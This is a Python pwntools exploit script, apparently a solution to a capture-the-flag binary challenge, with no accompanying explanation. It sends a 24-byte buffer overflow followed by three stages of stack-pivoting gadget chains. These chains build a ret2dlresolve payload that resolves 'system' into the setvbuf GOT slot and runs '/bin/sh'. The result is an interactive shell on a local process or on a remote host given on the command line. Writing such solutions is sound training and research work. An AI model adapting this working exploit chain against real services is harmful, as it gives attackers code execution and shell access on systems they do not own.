#!/usr/bin/env python3

from pwn import context, p64, remote, Ret2dlresolvePayload, sys


context.binary = 'chall_patched'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


pop_rbp_ret_addr = 0x40113d
leave_ret_addr = 0x4011f2

bin_sh_addr = 0x404048

jmp_plt_addr = 0x401039

call_setvbuf_addr = 0x40119a

dlresolve = Ret2dlresolvePayload(
    context.binary,
    symbol='system',
    args=[],
    resolution_addr=context.binary.got.setvbuf,
)

io = get_process()

stage1  = p64(pop_rbp_ret_addr)
stage1 += p64(context.binary.got.stderr + 0x10)
stage1 += p64(context.binary.sym.main + 28)

io.sendline(b'A' * 24 + stage1)

stage2  = p64(pop_rbp_ret_addr)
stage2 += p64(dlresolve.data_addr - 0x80 + 0x10)
stage2 += p64(leave_ret_addr)
stage2 += b'\0' * 0xd20
stage2 += p64(dlresolve.data_addr - 0x80 + 0x10)
stage2 += p64(context.binary.sym.main + 28)

io.sendline(p64(bin_sh_addr) + b'/bin/sh\0' + b'\0' * 8 + stage2)

stage3  = p64(jmp_plt_addr)
stage3 += p64(dlresolve.reloc_index)
stage3 += p64(call_setvbuf_addr)
stage3 += b'\0' * 0x50
stage3 += dlresolve.payload

io.sendline(b'A' * 24 + stage3)

io.interactive()
